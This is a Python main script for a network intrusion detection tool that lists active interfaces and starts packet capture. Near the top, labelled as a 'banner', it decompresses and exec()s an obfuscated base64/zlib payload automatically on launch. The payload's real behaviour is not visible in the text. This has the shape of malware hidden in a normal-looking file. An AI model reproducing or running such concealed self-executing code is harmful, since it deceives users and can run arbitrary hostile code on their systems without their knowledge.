import sys
import psutil

from modules.PacketCapture import PacketCapture
from modules.TrafficAnalyzer import TrafficAnalyzer
from modules.AlertSystem import AlertSystem
from modules.IntrusionDetectionSystem import IntrusionDetectionSystem

# D4rkScyth3 Banner
import zlib, base64
from colorama import Fore, Style, init
init(autoreset=True)

ENCODED_CODE = "eJytVFFv2kAMfs+vsNKXS1m5aZv2gMQDWzM6iVGp0FWVTjoFGko0kqBwaKp6/PfZvgu9lD1iKXCxP/uzvyReNXUJy3pTN1mZQVFu68bAj7rJP8DMvGzwr6gKE9GPyPYGA7vcDOfNPk+i6ClfwW5d/9WLrKryRiSDCNDcHQyhWcVxHL1Suf73x9H0AJoN2PxBtz7vDj0hPIicugBCGkFuAEVxiVcCIBwSEge7S68P1gNUG3s7WI6AtIqptJZHj3R9qw6hpfqKiSTIBCwAu9BjLUfQ7T3q7SC4A0lpeJHT8lmAVdQ3RpXq8liGWkwSGlM08VDPzCM00rQeClkvkmI0lfROh+FGgQ/ylAZ/hdcay3uxO/rRMxPQ0uGsR0I/WEjodLMOjmn/nwtaKbBD5SUB0kn5wggKaLxs4VxBITy81w/JJT+nNoUUx+paW24Yj1Jpp40XUqpj+YDHPycGY15HPyeIdvOz9AgkUehFcm7PQkQerR3CJyWaZ3d3yqoWEsEZrXcVWM9PML5LU/xSz2q/4SfM4AamcN9ZB2e17jSvvL7wRZ2lcz2aTA4R7SLCbZuiMsItqSTwcF+/RuN0Oh9BD+KLCxgX5ma/QMQA1sZsdwMpnwuz3i/6y7qU11+aP7Pli1l/jk/qfJvcp77IPN/kz7hegyKmX+byCdN3nK6x4mmJx3QyuX2gIlcxXMLXjyEiVlV8+Ql3cFSs8MuqsjLHr2o4hFjrMisqrWO3jDv7GeH/AO/qap0="

def run_encoded_code():
    try:
        exec(zlib.decompress(base64.b64decode(ENCODED_CODE)).decode("utf-8"))
    except Exception as e:
        print("[!] Error executing encoded code:", e)

run_encoded_code()


def list_active_interfaces():
    """Return all active interfaces (with IPv4, skip loopback)."""
    interfaces = []
    for name, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == 2 and addr.address != "127.0.0.1":
                interfaces.append(name)
    return interfaces


def main():
    interfaces = list_active_interfaces()
    if not interfaces:
        print("No active network interfaces found.")
        sys.exit(1)

    print("Starting NIDS on ALL active interfaces...")
    print("Interfaces:", ", ".join(interfaces))

    alert_system = AlertSystem()
    analyzer = TrafficAnalyzer(alert_system)
    ids = IntrusionDetectionSystem(alert_system=alert_system, logs_dir="logs")

    sniffer = PacketCapture(interfaces, analyzer)
    sniffer.start()

if __name__ == "__main__":
    main()
